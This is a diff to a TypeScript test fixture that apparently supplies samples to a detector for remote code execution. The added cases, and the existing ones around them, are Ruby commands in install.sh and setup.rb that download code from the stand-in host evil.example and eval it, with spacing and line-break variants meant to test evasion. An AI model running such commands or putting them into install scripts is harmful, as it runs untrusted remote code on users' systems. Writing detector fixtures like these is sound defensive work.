@@ -40,6 +40,14 @@ const FETCHED_CODE: Record<string, [string, string]> = {
     "install.sh",
     "#!/bin/sh\nruby -rnet/http -e \"eval(Net::HTTP.get_response(URI.parse('https://evil.example/x.rb')).body)\"\n",
   ],
+  "ruby eval of Net::HTTP.get with a spaced URI .parse in an install script": [
+    "install.sh",
+    "#!/bin/sh\nruby -rnet/http -e \"eval(Net::HTTP.get(URI .parse('https://evil.example/x.rb')))\"\n",
+  ],
+  "ruby eval of Net::HTTP.get_response with a line-broken URI.parse in Ruby source": [
+    "tools/setup.rb",
+    "require 'net/http'\neval(Net::HTTP.get_response(URI\n  .parse('https://evil.example/x.rb')).body)\n",
+  ],
   "ruby eval of Net::HTTP.get with URI.parse in Ruby source": [
     "tools/setup.rb",
     "require 'net/http'\neval(Net::HTTP.get(URI.parse('https://evil.example/x.rb')))\n",
